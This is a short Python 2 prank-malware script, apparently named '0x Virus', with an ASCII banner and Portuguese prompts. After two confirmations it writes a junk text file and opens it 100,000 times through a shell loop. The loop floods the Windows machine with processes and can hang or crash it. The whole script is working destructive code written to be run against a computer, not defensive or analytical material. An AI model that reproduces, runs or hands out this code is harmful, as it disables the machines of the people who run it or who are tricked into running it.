#!/usr/bin/python
#Coded By J0K3R00T

import os,time
os.system("clear||cls")

print"  _____        _   _ _                              "
print" |  _  |      | | | (_)                             "
print" | |/' |_  __ | | | |_ _ __ _   _ ___   _ __  _   _ "
print" |  /| \ \/ / | | | | | '__| | | / __| | '_ \| | | |"
print" \ |_/ />  <  \ \_/ / | |  | |_| \__ \_| |_) | |_| |"
print"  \___//_/\_\  \___/|_|_|   \__,_|___(_) .__/ \__, |"
print"                                       | |     __/ |"
print"                                       |_|    |___/ "
print "Coded BY J0K3R00T"
print "Responda as Pegunta com Letra Maiuscula!!"
print 
x = raw_input("Deseja Continuar ? [Y/N] ")

yes = "Y"
no = "N"

if x == yes:
	print("Esse e um Caminho Sem Volta!!!\n")
elif x == no:
	print("Fez Certo !!!")
	exit()
else:
	print "Erro Na Selecao !!!"
	
time.sleep(2) 
print
i = raw_input("Tem Certa que Deseja Continuar \"ULTIMA CHANCE\" [Y/N] ")

if i == yes:
	if os.path.exists('joker.txt'): os.unlink('joker.txt')
	print("Como vc Insiste Iniciando !!!")
	open("joker.txt", "w").write("B0MB3R V1RU2B0MB3R " * 1000)
	
	x = 99999
	while x >= 0:
		os.system("start joker.txt")
		x -= 1
elif i == no:
	print("Fez Certo !!!")
	exit()